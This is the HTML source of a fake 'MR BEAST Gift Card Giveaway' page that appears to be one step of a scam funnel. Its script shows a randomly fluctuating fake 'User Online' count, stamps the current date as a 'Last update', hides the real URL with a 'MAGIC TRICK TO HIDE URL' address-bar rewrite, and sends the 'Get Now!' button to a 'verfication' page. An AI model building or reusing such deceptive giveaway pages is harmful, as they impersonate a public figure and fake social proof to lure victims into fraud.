<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your Gift Card!</title>
    
    <!-- 🚀 REFRESH CHECK TRICK: Page refresh pe home page bhejne ke liye 🚀 -->
    <script>
        if (performance.navigation.type === 1) {
            window.location.href = "index.html";
        }
    </script>

    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&family=Permanent+Marker&family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        :root { --mrbeast-blue: #00AEEF; --mrbeast-red: #FF0000; }
        
        body { 
            margin: 0; 
            font-family: 'Poppins', sans-serif; 
            color: #111; 
            text-align: center; 
            min-height: 100vh; 
            overflow-x: hidden;
            background-color: #00AEEF;
            display: flex;
            flex-direction: column;
            justify-content: center; 
            align-items: center;     
        }

        /* --- BACKGROUND ANIMATION --- */
        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0; 
            background-color: #00AEEF;
            background-image: url('./imagesss/wbbg.png');
            background-size: cover; 
            background-position: 0 center;
            background-repeat: repeat-x; 
            z-index: -1; 
            animation: slideDesktop 10000s linear infinite; 
        }

        @keyframes slideDesktop {
            0% { background-position: 0px center; }
            100% { background-position: -2000000px center; } 
        }

        .language-switcher { position: absolute; top: 15px; right: 15px; z-index: 9999; }
        
        /* --- HEADER STYLES --- */
        .mrbeast-hero { position: relative; padding: 15px 0 0; margin-bottom: 5px; z-index: 2; width: 100%; }
        .mrbeast-logo-top { width: 120px; margin-bottom: 0px; position: relative; z-index: 2; }
        
        .mrbeast-text-group { display: flex; flex-direction: column; align-items: center; }

        .mrbeast-text-group h1 { 
            font-family: 'Permanent Marker', cursive; 
            font-size: 3.8rem; 
            font-weight: 400; 
            color: #000; 
            margin: 0; 
            line-height: 1; 
        }
        
        .mrbeast-text-group p { 
            font-family: 'Luckiest Guy', cursive; 
            font-size: 2.6rem; 
            font-weight: 400;
            color: #000; 
            margin: 0; 
            letter-spacing: 2px;
            line-height: 1;
        }
        
        .user-info { 
            font-family: 'Poppins', sans-serif;
            font-size: 1.1rem; 
            font-weight: 900; 
            color: #111; 
            margin: 8px 0 10px 0; 
            white-space: nowrap; 
        }
        .user-info strong, .user-info #currentDate { color: var(--mrbeast-red); font-weight: 900; }
        
        /* ==================================================== */
        /* --- CONTAINER (BASE/DESKTOP) EXACT MATCH --- */
        /* ==================================================== */
        
        .single-gift-card-container {
            position: relative;
            padding: 22px 15px; 
            width: 230px;       
            margin: 0 auto 20px auto;
            border-radius: 15px;
            display: flex;
            flex-direction: column;
            align-items: center;
            z-index: 2;
            overflow: hidden; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.5); 
        }

        /* Inner Box: TRANSPARENT DARK GLASS */
        .single-gift-card-container::after {
            content: '';
            position: absolute;
            inset: 3px; 
            background: rgba(15, 20, 25, 0.85); 
            backdrop-filter: blur(8px); 
            -webkit-backdrop-filter: blur(8px);
            border-radius: 12px;
            z-index: -1;
        }

        /* Rotating Glowing Border Animation */
        .single-gift-card-container::before {
            content: '';
            position: absolute;
            top: -50%; left: -50%; width: 200%; height: 200%;
            background: conic-gradient(from 0deg, transparent 75%, rgba(255, 255, 255, 0.9) 100%);
            animation: rotateBorder 3s linear infinite;
            z-index: -2;
        }

        @keyframes rotateBorder {
            100% { transform: rotate(360deg); }
        }
        
        /* --- CARD IMAGE WRAPPER --- */
        .card-image-wrapper {
            background: white;
            padding: 4px;        
            border-radius: 10px;
            width: 88%;          
            box-sizing: border-box;
            margin-bottom: 5px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        
        .card-image-wrapper img { 
            width: 100%; 
            height: auto; 
            display: block; 
            border-radius: 6px;
        }

        .separator-icon {
            color: #666; 
            font-size: 20px;
            font-weight: 900;
            line-height: 1;
            margin: 6px 0;
            letter-spacing: -1px;
        }
        
        .instruction-text { 
            color: white; 
            font-family: 'Poppins', sans-serif;
            font-weight: 400; 
            margin: 0 0 12px 0; 
            font-size: 1.05rem; 
            line-height: 1.3;
            text-align: center;
        }
        
        /* --- BUTTON --- */
        .get-now-button { 
            background: #007bff; 
            color: white; 
            border: none; 
            border-radius: 8px; 
            padding: 10px; 
            font-family: 'Luckiest Guy', cursive; 
            font-size: 1.4rem; 
            letter-spacing: 1.5px;
            cursor: pointer; 
            width: 88%; 
            transition: 0.3s; 
        }
        .get-now-button:hover { 
            background: #005bb5; 
            transform: scale(1.03);
        }

        /* ========================================= */
        /* --- RESPONSIVE MEDIA QUERIES --- */
        /* ========================================= */

        /* --- DESKTOP ALIGNMENT SHIFT (768px and above) --- */
        @media (min-width: 768px) {
            body {
                justify-content: center; 
                padding-top: 0; 
                height: 100vh; 
                overflow-y: hidden; 
                box-sizing: border-box;
            }
        }

        @media (max-width: 1050px) {
            .mrbeast-logo-top { width: 100px; }
            .mrbeast-text-group h1 { font-size: 3.2rem; }
            .mrbeast-text-group p { font-size: 2rem; }
            .user-info { font-size: 0.95rem; } 
        }

        /* --- MOBILE PHONES (Up to 480px) --- */
        @media (max-width: 480px) {
            body::before { background-size: auto 100%; animation: slideMobile 10000s linear infinite; }
            .language-switcher { top: 10px; right: 10px; transform: scale(0.8); transform-origin: top right; }
            
            .mrbeast-logo-top { width: 85px; }
            .mrbeast-text-group h1 { font-size: 3.0rem; line-height: 1; margin-bottom: 2px;} 
            .mrbeast-text-group p { font-size: 1.8rem; letter-spacing: 1px; } 
            
            .user-info { font-size: 0.85rem; margin: 5px 0 10px 0; white-space: normal; line-height: 1.3; padding: 0 10px;}

            .single-gift-card-container { 
                width: 220px; 
                padding: 18px 12px; 
                margin-top: 5px;
            }
            .card-image-wrapper { width: 80%; padding: 3px; } 
            .get-now-button { font-size: 1.4rem; width: 90%; padding: 8px;}
            .instruction-text { font-size: 1.05rem; }
        }

        /* --- EXTRA SMALL MOBILE (320px SCREENSHOT EXACT FIX) --- */
        @media (max-width: 360px) {
            .language-switcher { transform: scale(0.7); right: 5px; top: 8px; }
            .mrbeast-hero { padding-top: 5px; }
            .mrbeast-logo-top { width: 75px; } 
            .mrbeast-text-group h1 { font-size: 2.6rem; } 
            .mrbeast-text-group p { font-size: 1.5rem; } 
            
            .user-info { font-size: 0.75rem; margin: 5px 0 5px 0; }
            
            .single-gift-card-container { 
                width: 195px; 
                padding: 15px 10px; 
            }
            
            .card-image-wrapper { 
                width: 80%; 
                padding: 2px; 
            }
            
            .instruction-text { font-size: 0.95rem; margin-bottom: 8px;}
            
            .get-now-button { 
                font-size: 1.2rem; 
                padding: 6px; 
                width: 90%; 
            }
        }

        /* --- HEIGHT CONSTRAINT --- */
        @media (max-height: 680px) {
            .mrbeast-hero { padding-top: 5px; }
            .mrbeast-logo-top { width: 75px; }
            .mrbeast-text-group h1 { font-size: 2.6rem; }
            .mrbeast-text-group p { font-size: 1.5rem; }
            
            .user-info { margin: 5px 0; }
            .single-gift-card-container { padding: 12px; margin-bottom: 8px;}
        }

        /* ======================================================== */
        /* --- DESKTOP SCALING FIX (Match screenshot sizes) --- */
        /* ======================================================== */
        @media (min-width: 1051px) {
            .mrbeast-logo-top { width: 90px; }
            .mrbeast-text-group h1 { font-size: 3rem; }
            .mrbeast-text-group p { font-size: 2rem; letter-spacing: 1.5px;}
            .user-info { font-size: 0.95rem; margin: 5px 0 10px 0; }
            
            .single-gift-card-container { 
                width: 210px; 
                padding: 18px 12px; 
            }
            .card-image-wrapper { padding: 4px; margin-bottom: 4px; width: 85%; }
            .separator-icon { font-size: 18px; margin: 4px 0; }
            .instruction-text { font-size: 1rem; margin-bottom: 10px; }
            .get-now-button { font-size: 1.2rem; padding: 8px; width: 85%; }
        }

        @keyframes slideMobile {
            0% { background-position: 0px center; }
            100% { background-position: -1333333px center; }
        }
    </style>
</head>
<body>
    
    <div class="language-switcher"><div class="gtranslate_wrapper"></div></div>
    
    <!-- Header -->
    <div class="mrbeast-hero">
        <img src="./imagesss/mrbeastlogo.png" class="mrbeast-logo-top">
        <div class="mrbeast-text-group">
            <h1>MR BEAST</h1>
            <p>GIFT CARD GIVEAWAY</p>
        </div>
        <div class="user-info">User Online: <strong id="onlineUsers">273</strong> | Last update: <strong id="currentDate">Mar 18 2026</strong></div>
    </div>

    <!-- NEW ANIMATED CARD STRUCTURE -->
    <div class="single-gift-card-container">
        
        <!-- White image border container -->
        <div class="card-image-wrapper">
            <img id="selectedImg" src="">
        </div>
        
        <!-- The small separator line/icon -->
        <div class="separator-icon">=</div>
        
        <!-- Text & Button -->
        <div class="instruction-text">Here is your gift<br>card!</div>
        <button class="get-now-button" id="getNowBtn">Get Now!</button>

    </div>

    <!-- Scripts -->
    <script>window.gtranslateSettings = {"default_language":"en","detect_browser_language":true,"wrapper_selector":".gtranslate_wrapper"}</script>
    <script src="https://cdn.gtranslate.net/widgets/latest/dropdown.js" defer></script>
    <script>
        // MAGIC TRICK TO HIDE URL
        window.history.replaceState(null, "", "/#header");

        // Load image from background
        const savedImg = localStorage.getItem('selectedCard');
        document.getElementById('selectedImg').src = savedImg || '.imagesss/amazon.png';
        
        // Go to verification directly
        document.getElementById('getNowBtn').onclick = () => { window.location.href = 'verfication.html'; };
        
        function updateOnlineUsers() {
            const el = document.getElementById('onlineUsers');
            if(!el) return;
            let current = parseInt(el.innerText);
            let newValue = current + (Math.floor(Math.random() * 11) - 5);
            if(newValue < 250) newValue = 280; if(newValue > 350) newValue = 310;
            el.innerText = newValue;
            
            const d = new Date();
            const month = d.toLocaleString('en-US', { month: 'short' });
            const day = d.getDate();
            const year = d.getFullYear();
            const dateEl = document.getElementById('currentDate');
            if(dateEl) dateEl.innerText = `${month} ${day} ${year}`;
        }
        setInterval(updateOnlineUsers, 5000); 
        updateOnlineUsers(); 
    </script>
</body>
</html>
